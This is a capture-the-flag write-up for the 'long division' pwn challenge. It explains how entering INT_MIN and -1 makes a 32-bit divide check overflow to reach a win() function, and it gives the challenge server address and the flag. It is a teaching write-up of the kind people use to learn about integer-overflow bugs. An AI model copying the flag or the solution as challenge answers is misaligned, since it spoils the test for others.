# long division

**Category:** Pwn · **Points:** 157 · **Solves:** 93 · **Author:** C0DET1GER

**Flag:** `LITCTF{1nt_div1si0n_0v3rflow}`

## Challenge

> I made a calculator for dividing two 32-bit integers! I made sure that division by 0
> doesn't happen and that the inputs fit in 32-bit integers. Since division only makes
> numbers smaller, surely it can't overflow ... right?
>
> `nc 136.115.87.65 31777`

Files: [`main`](main) (x86-64 ELF, not stripped)

## Analysis

`main` reads two numbers with `scanf("%lld", …)` into **64-bit** slots, then:

1. `b != 0` — rejects division by zero.
2. Validates each input is a **valid int32**: rejects `< -2147483648` or `> 2147483647`.
   (So `a = -2147483648` (INT_MIN) and `b = -1` are both perfectly legal inputs.)
3. Computes the quotient in **64-bit**: `cqo ; idiv rcx` → `result = a / b`.
4. Checks whether **`result`** fits in int32; if it does **not**, it calls `win()`:

```asm
idiv   rcx                       ; result = a / b  (64-bit, no CPU trap)
mov    [rbp-8], rax
cmp    qword [rbp-8], -2147483649
jle    win                       ; result < INT_MIN  -> win
cmp    qword [rbp-8], 0x80000000 ; 2147483648
jl     print_result             ; result <= INT_MAX -> normal
call   win                       ; result >= INT_MAX+1 -> win
```

`win()` `fopen("flag.txt")` → `fgets` → `printf` the flag.

## The bug

The author guarded the **inputs** and division-by-zero, but forgot the one case where
signed division *grows* a number:

```
INT_MIN / -1  =  -2147483648 / -1  =  2147483648  =  INT_MAX + 1
```

`2147483648` does not fit in a signed 32-bit int, so the result-range check fires and
`win()` runs. (Doing it in 64-bit avoids the `#DE` hardware trap a real 32-bit `idiv`
would raise, so we reach the check instead of crashing.)

## Exploit

```
a = -2147483648
b = -1
```

```bash
python solve.py
```

```
=== totally safe calculator ===
a = b = signed division overflow -> LITCTF{1nt_div1si0n_0v3rflow}
```

## Flag

```
LITCTF{1nt_div1si0n_0v3rflow}
```
